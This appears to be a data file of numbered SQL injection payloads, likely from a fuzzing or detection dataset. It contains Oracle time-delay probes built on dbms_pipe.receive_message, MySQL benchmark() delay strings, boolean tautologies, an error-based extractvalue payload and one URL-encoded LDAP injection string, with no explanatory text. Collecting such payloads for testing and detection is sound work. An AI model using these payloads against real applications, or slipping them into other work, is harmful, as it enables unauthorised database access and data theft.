29 end and    (    (   2160  =  2160 
46 1%'   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  -- 
76 1%"   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   "%"  =  " 
189 -9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299 
203  (  8266  =  8266  )  *9900 
220 *| 
281 as 
310  end and    (    (     (  "memh" like "memh 
349 1%" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and "%"  =  " 
364 1""  (  .'.  (  ,  (  . 
368 1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk 
401 select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847 
432 %2A%28%7C%28objectclass%3D%2A%29%29 
536 " " 
556 1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  ' 
697 1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  ' 
710 ns 
720  end and    (    (   "dmgj"  =  "dmgj 
734 1" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   
738 28% 
760 1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554 
934 1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010 
980 select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   # idxq 
1005 end and    (    (     (  'xzbk'  =  'xzbk 
1025 1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  # 
1069 -5147 or   (  8459  =  8459  )  *4906 
1140  end and    (    (   "%"  =  " 
1143 iif  (  1217  =  8831,1,1/0  )   
